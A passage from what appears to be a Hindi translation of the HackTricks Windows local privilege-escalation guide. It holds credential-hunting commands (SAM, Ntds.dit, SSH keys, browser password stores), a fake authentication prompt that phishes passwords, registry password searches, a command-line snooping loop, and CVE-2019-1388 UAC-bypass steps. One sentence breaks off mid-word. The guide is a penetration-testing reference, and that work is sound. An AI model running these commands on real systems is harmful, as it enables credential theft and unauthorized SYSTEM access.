$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### प्रमाण-पत्र के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके प्रमाण-पत्र या यहां तक कि किसी अन्य उपयोगकर्ता के प्रमाण-पत्र दर्ज करने के लिए कह सकते हैं** यदि आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि **प्रमाण-पत्र** के लिए सीधे ग्राहक से पूछना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइल नाम जिनमें क्रेडेंशियल्स हो सकते हैं**

ज्ञात फ़ाइलें जिनमें कुछ समय पहले **पासवर्ड** **स्पष्ट-पाठ** या **Base64** में होते थे
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों की खोज करें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको Bin की जांच भी करनी चाहिए ताकि उसमें मौजूद credentials की तलाश की जा सके

कई प्रोग्राम्स द्वारा सहेजे गए **passwords को पुनः प्राप्त** करने के लिए आप इसका उपयोग कर सकते हैं: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**Credentials के साथ अन्य संभावित रजिस्ट्री कीज**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**रजिस्ट्री से openssh कुंजियों को निकालें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़र्स हिस्ट्री

आपको उन डेटाबेस की जांच करनी चाहिए जहां **Chrome या Firefox** के पासवर्ड संग्रहीत होते हैं।\
साथ ही ब्राउज़र्स की हिस्ट्री, बुकमार्क्स और फेवरेट्स की भी जांच करें ताकि कुछ **पासवर्ड** वहां संग्रहीत हो सकते हैं।

ब्राउज़र्स से पासवर्ड निकालने के लिए उपकरण:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)****

### **COM DLL ओवरराइटिंग**

**Component Object Model (COM)** एक तकनीक है जो Windows ऑपरेटिंग सिस्टम के भीतर बनाई गई है जो विभिन्न भाषाओं के सॉफ्टवेयर घटकों के बीच **अंतर-संचार** की अनुमति देती है। प्रत्येक COM घटक की पहचान **क्लास ID (CLSID)** के माध्यम से की जाती है और प्रत्येक घटक एक या अधिक इंटरफेस के माध्यम से कार्यक्षमता प्रदान करता है, जिसे इंटरफेस ID (IIDs) के माध्यम से पहचाना जाता है।

COM क्लासेस और इंटरफेसेस को रजिस्ट्री के तहत **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और **HKEY\_**_**CLASSES\_**_**ROOT\Interface** में क्रमशः परिभाषित किया गया है। यह रजिस्ट्री **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT** को मिलाकर बनाई गई है।

इस रजिस्ट्री के CLSIDs के अंदर आपको चाइल्ड रजिस्ट्री **InProcServer32** मिलेगी जिसमें एक **डिफ़ॉल्ट मान** होता है जो एक **DLL** की ओर इशारा करता है और एक मान होता है जिसे **ThreadingModel** कहा जाता है जो **Apartment** (सिंगल-थ्रेडेड), **Free** (मल्टी-थ्रेडेड), **Both** (सिंगल या मल्टी) या **Neutral** (थ्रेड न्यूट्रल) हो सकता है।

![](<../../.gitbook/assets/image (638).png>)

मूल रूप से, यदि आप किसी भी DLL को **ओवरराइट कर सकते हैं** जो निष्पादित किया जाने वाला है, तो आप **विशेषाधिकार बढ़ा सकते हैं** यदि वह DLL किसी अन्य उपयोगकर्ता द्वारा निष्पादित किया जाने वाला है।

COM Hijacking का उपयोग हमलावरों द्वारा एक स्थायित्व तंत्र के रूप में कैसे किया जाता है, इसे जानने के लिए देखें:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **फाइलों और रजिस्ट्री में सामान्य पासवर्ड खोज**

**फाइल सामग्री की खोज करें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइलनाम वाली फ़ाइल की खोज करें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रजिस्ट्री में कुंजी नामों और पासवर्डों की खोज करें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड की खोज करने वाले उपकरण

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** प्लगइन है जिसे मैंने बनाया है ताकि **स्वचालित रूप से हर मेटास्प्लॉइट POST मॉड्यूल को निष्पादित किया जा सके जो पीड़ित के अंदर क्रेडेंशियल्स की खोज करता है**।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस पृष्ठ पर उल्लिखित सभी फाइलों में पासवर्ड की स्वचालित खोज करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) एक और शानदार उपकरण है जो सिस्टम से पासवर्ड निकालने के लिए है।

उपकरण [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **सत्रों**, **उपयोगकर्ता नामों** और **पासवर्डों** की खोज करता है कई उपकरणों के लिए जो इस डेटा को स्पष्ट पाठ में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## लीक हुए हैंडलर्स

कल्पना कीजिए कि **एक प्रक्रिया SYSTEM के रूप में चल रही है और एक नई प्रक्रिया खोलती है** (`OpenProcess()`) **पूरी पहुंच के साथ**। वही प्रक्रिया **एक नई प्रक्रिया भी बनाती है** (`CreateProcess()`) **कम विशेषाधिकारों के साथ लेकिन मुख्य प्रक्रिया के सभी खुले हैंडल्स को विरासत में लेती है**।\
फिर, अगर आपके पास **कम विशेषाधिकार वाली प्रक्रिया की पूरी पहुंच है**, आप **विशेषाधिकार प्राप्त प्रक्रिया के खुले हैंडल को पकड़ सकते हैं** जो `OpenProcess()` के साथ बनाई गई थी और **शेलकोड इंजेक्ट कर सकते हैं**।\
[इस उदाहरण को पढ़ें और जानें **कैसे इस कमजोरी का पता लगाएं और इसका शोषण करें**।](leaked-handle-exploitation.md)\
[इस **अन्य पोस्ट को पढ़ें जिसमें विभिन्न स्तरों की अनुमतियों के साथ विरासत में मिले प्रक्रियाओं और धागों के अधिक खुले हैंडलर्स का परीक्षण करने और दुरुपयोग करने का अधिक पूर्ण विवरण है (केवल पूरी पहुंच नहीं)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## नामित पाइप क्लाइंट इम्पर्सनेशन

`पाइप` एक साझा मेमोरी का ब्लॉक है जिसका उपयोग प्रक्रियाएं संचार और डेटा आदान-प्रदान के लिए कर सकती हैं।

`नामित पाइप्स` एक Windows तंत्र है जो दो असंबंधित प्रक्रियाओं को आपस में डेटा आदान-प्रदान करने की अनुमति देता है, भले ही प्रक्रियाएं दो अलग-अलग नेटवर्क पर स्थित हों। यह क्लाइंट/सर्वर आर्किटेक्चर के समान है क्योंकि `नामित पाइप सर्वर` और नामित `पाइप क्लाइंट` की धारणाएं मौजूद हैं।

जब एक **क्लाइंट पाइप पर लिखता है**, तो **सर्वर** जिसने पाइप बनाया है, **क्लाइंट का इम्पर्सनेट** कर सकता है अगर उसके पास **SeImpersonate** विशेषाधिकार हैं। फिर, अगर आप एक **विशेषाधिकार प्राप्त प्रक्रिया को ढूंढ सकते हैं जो किसी भी पाइप पर लिखने वाली है जिसे आप इम्पर्सनेट कर सकते हैं**, आप **विशेषाधिकार बढ़ा सकते हैं** उस प्रक्रिया का इम्पर्सनेशन करके जब वह आपके बनाए पाइप के अंदर लिखती है। [**इस हमले को कैसे करें यह जानने के लिए यह पढ़ें**](named-pipe-client-impersonation.md) **या** [**यह**](./#from-high-integrity-to-system)**.**

**इसके अलावा निम्नलिखित टूल एक टूल की तरह burp के साथ नामित पाइप संचार को इंटरसेप्ट करने की अनुमति देता है:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल प्रिवेस्क्स को ढूंढने के लिए सभी पाइप्स को सूचीबद्ध करने और देखने की अनुमति देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## विविध

### **पासवर्ड्स के लिए कमांड लाइन्स की निगरानी**

जब आप एक उपयोगकर्ता के रूप में एक शेल प्राप्त करते हैं, तो हो सकता है कि अनुसूचित कार्य या अन्य प्रक्रियाएं चल रही हों जो **कमांड लाइन पर क्रेडेंशियल्स पास करती हैं**। नीचे दी गई स्क्रिप्ट हर दो सेकंड में प्रक्रिया कमांड लाइन्स को कैप्चर करती है और वर्तमान स्थिति की तुलना पिछली स्थिति से करती है, किसी भी अंतर को आउटपुट करती है।
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## लो प्रिव यूजर से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC बायपास

यदि आपके पास ग्राफिकल इंटरफेस (कंसोल या RDP के माध्यम से) तक पहुँच है और UAC सक्रिय है, तो Microsoft Windows के कुछ संस्करणों में यह संभव है कि "NT\AUTHORITY SYSTEM" जैसे टर्मिनल या कोई अन्य प्रक्रिया को एक अनाधिकृत यूजर से चलाया जा सके।

इससे विशेषाधिकारों को बढ़ाना और एक ही समय में UAC को बायपास करना संभव हो जाता है, वही भेद्यता के साथ। इसके अतिरिक्त, कुछ भी स्थापित करने की आवश्यकता नहीं है और प्रक्रिया के दौरान उपयोग किया गया बाइनरी, Microsoft द्वारा हस्ताक्षरित और जारी किया गया है।

निम्नलिखित कुछ प्रभावित सिस्टम हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस संवेदनशीलता का शोषण करने के लिए, निम्नलिखित चरणों को प्रदर्शन करना आवश्यक है:

```
1) HHUPD.EXE फ़ाइल पर राइट क्लिक करें और इसे एडमिनिस्ट्रेटर के रूप में चलाएं।

2) जब UAC प्रॉम्प्ट प्रकट होता है, "अधिक विवरण दिखाएं" का चयन करें।

3) "प्रकाशक प्रमाणपत्र जानकारी दिखाएं" पर क्लिक करें।

4) यदि सिस्टम संवेदनशील है, तो "जारी किया गया" URL लिंक पर क्लिक करने पर, डिफ़ॉल्ट वेब ब्राउज़र प्रकट हो सकता है।

5) साइट को पूरी तरह से लोड होने का इंतजार करें और "सेव एज़" का चयन करके एक्सप्लोरर.exe विंडो लाएं।

6) एक्सप्लोरर विंडो के पते के पथ में cmd.exe, powershell.exe या कोई अन्य इंटरैक्टिव प्रक्रिया दर्ज करें।

7) अब आपके पास "NT\AUTHORITY SYSTEM" कमांड प्रॉम्प्ट होगा।

8) अपने डेस्कटॉप पर वापस आने के लिए सेटअप और UAC प्रॉम्प्ट को रद्द करना न भूलें।
```

आपके पास निम्नलिखित GitHub रिपॉजिटरी में सभी आवश्यक फ़ाइलें और जानकारी हैं:

https://github.com/jas502n/CVE-2019-1388

## एडमिनिस्ट्रेटर मीडियम से हाई इंटेग्रिटी लेवल / UAC बायपास

**इंटेग्रिटी लेवल्स के बारे में जानने के लिए** इसे पढ़ें:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

फिर **UAC और UAC बायपास के बारे में जानने के लिए इसे पढ़ें:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **हाई इंटेग्रिटी से सिस्टम तक**

### **नई सेवा**

यदि आप पहले से ही हाई इंटेग्रिटी प्रक्रिया पर चल रहे हैं, तो **सिस्टम में पास होना** बस **नई सेवा बनाकर और निष्पादित करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

उच्च अखंडता प्रक्रिया से आप **AlwaysInstallElevated रजिस्ट्री प्रविष्टियों को सक्षम करने** और _**.msi**_ रैपर का उपयोग करके एक रिवर्स शेल **स्थापित करने** का प्रयास कर सकते हैं।\
[रजिस्ट्री कुंजियों और _.msi_ पैकेज कैसे स्थापित करें, इसके बारे में अधिक जानकारी यहाँ प्राप्त करें।](./#alwaysinstallelevated)

### High + SeImpersonate विशेषाधिकार से System तक

**आप** [**कोड यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### SeDebug + SeImpersonate से पूर्ण टोकन विशेषाधिकार तक

यदि आपके पास ये टोकन विशेषाधिकार हैं (संभवतः आपको यह एक पहले से ही उच्च अखंडता प्रक्रिया में मिलेगा), तो आप SeDebug विशेषाधिकार के साथ **लगभग किसी भी प्रक्रिया को खोलने** में सक्षम होंगे (संरक्षित प्रक्रियाएं नहीं), **प्रक्रिया के टोकन की प्रतिलिपि बनाएं**, और उस टोकन के साथ एक **मनमानी प्रक्रिया बनाएं**।\
इस तकनीक का उपयोग करते समय आमतौर पर **किसी भी प्रक्रिया को SYSTEM के रूप में चलाने के लिए चुना जाता है जिसमें सभी टोकन विशेषाधिकार होते हैं** (_हाँ, आपको SYSTEM प्रक्रियाएं बिना सभी टोकन विशेषाधिकार के मिल सकती हैं_)।\
**आप यहाँ प्रस्तावित तकनीक को निष्पादित करने वाले कोड का एक** [**उदाहरण पा सकते हैं**](sedebug-+-seimpersonate-copy-token.md)**।**

### **Named Pipes**

यह तकनीक meterpreter द्वारा `getsystem` में वृद्धि के लिए उपयोग की जाती है। तकनीक में **एक पाइप बनाना और फिर एक सेवा बनाने/दुरुपयोग करना शामिल है जो उस पाइप पर लिखती है**। फिर, **सर्वर** जिसने **`SeImpersonate`** विशेषाधिकार का उपयोग करके पाइप बनाया, वह पाइप क्लाइंट (सेवा) के टोकन की **नकल करने में सक्षम होगा**, जिससे SYSTEM विशेषाधिकार प्राप्त होंगे।\
यदि आप [**नामित पाइपों के बारे में और जानना चाहते हैं तो आपको यह पढ़ना चाहिए**](./#named-pipe-client-impersonation)।\
यदि आप उदाहरण पढ़ना चाहते हैं कि [**कैसे उच्च अखंडता से System तक नामित पाइपों का उपयोग करके जाया जा सकता है तो आपको यह पढ़ना चाहिए**](from-high-integrity-to-system-with-name-pipes.md)।

### Dll Hijacking

यदि आप **SYSTEM के रूप में चल रही प्रक्रिया द्वारा लोड की जा रही dll को हाइजैक करने** में सफल होते हैं, तो आप उन अनुमतियों के साथ मनमाना कोड निष्पादित करने में सक्षम होंगे। इसलिए Dll Hijacking भी इस प्रकार के विशेषाधिकार वृद्धि के लिए उपयोगी है, और इसके अलावा, यह उच्च अखंडता प्रक्रिया से प्राप्त करना **अधिक आसान है** क्योंकि इसमें dlls लोड करने के लिए उपयोग किए जाने वाले फ़ोल्डरों पर **लिखने की अनुमतियां** होंगी।\
**आप** [**Dll hijacking के बारे में और जान सकते हैं यहाँ**](dll-hijacking.md)**।**

### **Administrator या Network Service से System तक**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE या NETWORK SERVICE से पूर्ण विशेषाधिकार तक

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## अधिक सहायता

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## उपयोगी उपकरण

**Windows local privilege escalation vectors के लिए सर्वश्रेष्ठ उपकरण:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- गलत कॉन्फ़िगरेशन और संवेदनशील फ़ाइलों की जाँच करें (**[**यहाँ जाँचें**](../../windows/windows-local-privilege-escalation/broken-reference/)**). पता चला।**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित गलत कॉन्फ़िगरेशन की जाँच करें और जानकारी एकत्र करें (**[**यहाँ जाँचें**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- गलत कॉन्फ़िगरेशन की जाँच करें**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP सहेजे गए सत्र जानकारी निकालता है। स्थानीय में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से प्रमाणपत्र निकालता है। पता चला।**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- डोमेन में एकत्रित पासवर्ड स्प्रे करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS स्पूफर और मैन-इन-द-मिडल उपकरण है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- बेसिक privesc Windows एन्यूमरेशन**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc कमजोरियों की खोज करें (Watson के लिए DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- स्थानीय जाँचें **(Admin अधिकार चाहिए)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc कमजोरियों की खोज करें (VisualStudio का उपयोग करके संकलित करना होगा) ([**पूर्वसंकलित**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- मेजबान को एन्यूमरेट करता है गलत कॉन्फ़िगरेशन की खोज के लिए (अधिक एक जानकारी एकत्र करने वाला उपकरण से privesc) (संकलित करना होगा) **(**[**पूर्वसंकलित**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- बहुत सारे सॉफ्टवेयर से प्रमाणपत्र निकालता है (github में पूर्वसंकलित exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# में पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- गलत कॉन्फ़िगरेशन की जाँच करें (github में पूर्वसंकलित निष्पादनयोग्य)। अनुशंसित नहीं। Win10 में अच्छी तरह से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित गलत कॉन्फ़िगरेशन की जाँच करें (python से exe)। अनुशंसित नहीं। Win10 में अच्छी तरह से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया उपकरण (इसे ठीक से काम करने के लिए accesschk की आवश्यकता नहीं है लेकिन इसका उपयोग कर सकते हैं)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले शोषण की सिफारिश करता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के आउटपुट को पढ़ता है और काम करने वाले शोषण की सिफारिश करता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको परियोजना को सही .NET संस्करण का उपयोग करके संकलित करना होगा ([यह देखें](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). पीड़ित होस्ट पर .NET के स्थापित सं
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ सूची

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>
